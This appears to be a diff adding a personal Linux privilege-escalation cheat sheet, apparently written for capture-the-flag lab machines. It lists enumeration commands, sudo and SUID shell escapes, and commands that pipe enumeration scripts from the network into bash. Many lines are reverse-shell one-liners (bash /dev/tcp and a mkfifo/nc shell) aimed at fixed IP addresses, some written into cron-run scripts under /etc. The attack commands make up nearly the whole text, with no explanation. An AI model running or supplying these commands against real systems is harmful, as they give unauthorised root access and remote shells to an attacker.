@@ -1,0 +1,141 @@
+🔍 1. Basic Enumeration:
+whoami
+id
+hostname
+uname -a
+cat /etc/os-release
+
+📁 2. Check User’s Environment & Permissions:
+echo $PATH
+sudo -l
+ls -la ~
+cat ~/.bash_history
+
+📁 3. File System Enumeration:
+find / -name "*flag*" 2>/dev/null
+find / -name "*backup*" 2>/dev/null
+find / -name "*.log" 2>/dev/null
+
+World-writable files and SUID binaries:
+find / -perm -u=s -type f 2>/dev/null   # SUID
+find / -perm -g=s -type f 2>/dev/null   # SGID
+find / -writable -type d 2>/dev/null    # Writable directories
+
+🧪 4. Check Running Processes & Services:
+ps aux
+netstat -tulnp
+ss -tulnp
+
+🗃️ 5. Check for Scheduled Cron Jobs:
+cat /etc/crontab
+ls -la /etc/cron.*
+
+📜 6. Search for Credentials:
+grep -i 'password\|passwd\|pwd' /etc/* 2>/dev/null
+cat /var/www/html/config.php
+
+⚙️ 7. Kernel Exploits : uname -r
+
+🔧 8. Tools You Can Use:
+wget http://10.10.10.10/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+
+python3 -m http.server 80
+wget http://10.10.10.10/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+
+🔑 9. Misconfigured sudo (If sudo -l gives results):
+sudo su            # If allowed
+sudo -u root bash  # If bash allowed
+sudo <command>     # GTFOBins: https://gtfobins.github.io/
+sudo vim -c '!sh'
+sudo less /etc/shadow
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+sudo python3 -c 'import os; os.system("/bin/bash")'
+sudo python3 -c 'import os; os.system("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo 'import os\nos.system("/bin/bash")' > shell.py
+sudo perl -e 'exec "/bin/bash";'
+sudo php -r 'system("/bin/bash");'
+
+bash -c 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1'
+echo 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1' > /tmp/revshell.sh && chmod +x /tmp/revshell.sh && /tmp/revshell.sh
+
+echo '#!/bin/bash' > shell.sh
+echo '/bin/bash' >> shell.sh
+chmod +x shell.sh
+./shell.sh
+
+echo '#!/bin/bash' > rootbash.sh
+echo 'sudo /bin/bash' >> rootbash.sh
+chmod +x rootbash.sh
+./rootbash.sh
+
+echo -e '#!/bin/bash\n/bin/bash' > shell.sh && chmod +x shell.sh && ./shell.sh
+echo -e '#!/bin/bash\nsudo /bin/bash' > rootbash.sh && chmod +x rootbash.sh && ./rootbash.sh
+
+/bin/bash
+sudo /bin/bash
+
+curl -s https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | bash
+curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
+curl -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
+
+git clone https://github.com/carlospolop/PEASS-ng.git && cd PEASS-ng/linPEAS && chmod +x linpeas.sh && ./linpeas.sh
+git clone https://github.com/mzet-/linux-exploit-suggester.git && cd linux-exploit-suggester && chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
+git clone https://github.com/jondonas/linux-exploit-suggester-2.git && cd linux-exploit-suggester-2 && perl linux-exploit-suggester-2.pl
+git clone https://github.com/diego-treitos/linux-smart-enumeration.git && cd linux-smart-enumeration && ./lse.sh
+
+find /home -name user.txt 2>/dev/null
+find / -name user.txt 2>/dev/null
+find / -name user*.txt 2>/dev/null
+
+echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash" > /etc/print.sh
+/tmp/bash -p
+
+echo 'bash -i >& /dev/tcp/10.17.68.177/4444 0>&1' > /etc/print.sh
+
+rlwrap nc -lvnp 4444
+
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+chmod +x pspy64
+./pspy64
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.53/1234 0>&1'
+
+echo 'bash -i >& /dev/tcp/10.10.209.249/4444 0>&1' > /tmp/revshell.sh
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+Common Thing:
+whoami
+id
+cat user.txt
+sudo -l
+
+python -c "import pty; pty.spawn('/bin/bash')"
+python3 -c "import pty; pty.spawn('/bin/bash')"
+
+ls -la
+cd /
+ls
+cd opt
+ls
+cd admin_stuff
+ls
+cat script.sh
+
+bash -i >& /dev/tcp/10.17.68.177/5555 0>&1
+bash -c 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1'
+echo 'bash -i >& /dev/tcp/10.17.68.177/5555 0>&1' > /tmp/revshell.sh && chmod +x /tmp/revshell.sh && /tmp/revshell.sh
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.17.68.177/5555 0>&1
+
+Common Thing:
+python -c "import pty; pty.spawn('/bin/bash')"
+find / -name user.txt 2>/dev/null
+sudo -l
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.68.177 5554 > /tmp/f" > /etc/copy.sh
+
+
+
